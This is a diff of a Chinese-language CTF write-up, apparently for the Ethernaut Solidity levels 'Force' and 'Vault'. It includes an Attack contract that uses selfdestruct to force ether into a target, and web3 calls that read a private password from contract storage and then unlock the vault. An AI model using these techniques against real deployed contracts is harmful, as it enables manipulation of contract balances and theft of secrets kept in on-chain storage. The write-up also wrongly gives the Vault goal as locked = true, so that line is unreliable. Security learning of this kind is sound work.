@@ -326,3 +326,63 @@ if (result) {
         }
 ```
 这段代码似乎无用？
+
+# Force
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force { /*
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+    /~____  =ø= /
+    (______)__m_m)
+                   */ }
+```
+对于一个空合约，没有收款函数，咋一看好像无法转账。在 Solidity 中，通常合约通过 payable 函数接收资金。然而，Force 合约并没有实现任何 payable 函数，这意味着你不能直接通过调用该合约的函数来转账以使合约余额增加。即使合约本身没有 payable 函数，依然可以通过其他方式向合约发送以太币。例如，利用自毁（selfdestruct）的机制，强制向合约地址发送以太币。selfdestruct 会销毁调用的合约，并将合约的剩余余额转移到指定的地址。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    function attack() public payable {
+        selfdestruct(payable(address(0x001EFC76D2c63Bc20C4bA266333c76DE2803c7A1)));
+    }
+}
+```
+
+# Vault
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Vault {
+    bool public locked;
+    bytes32 private password;
+
+    constructor(bytes32 _password) {
+        locked = true;
+        password = _password;
+    }
+
+    function unlock(bytes32 _password) public {
+        if (password == _password) {
+            locked = false;
+        }
+    }
+}
+```
+- 目标是让 locked = true。虽然密码被声明为私有变量（private），但在以太坊智能合约中，合约的所有数据都是公开存储在区块链上的，所谓的“私有”只是指无法通过合约的接口直接访问。但我们可以通过区块链浏览器或其他调试工具，读取合约的存储状态，从而找到 password 的真实值。
+- 我们知道 password 是一个私有的 bytes32 类型的变量，存储在合约的状态变量中。根据 Solidity 的存储布局规则，password 变量会存储在某个固定的槽位中。使用 `web3.eth.getStorageAt(contractAddress, index)` 可以读取这个值。
+
+```js
+await web3.eth.getStorageAt(instance, 1)
+// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
+await web3.eth.getStorageAt(instance, 1).then(web3.utils.toAscii)
+// A very strong secret password :)
+// 补充： 通过 web3.utils.toAscii / web3.utils.toHex 可以转为可见字符或者/bytes
+await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
+```
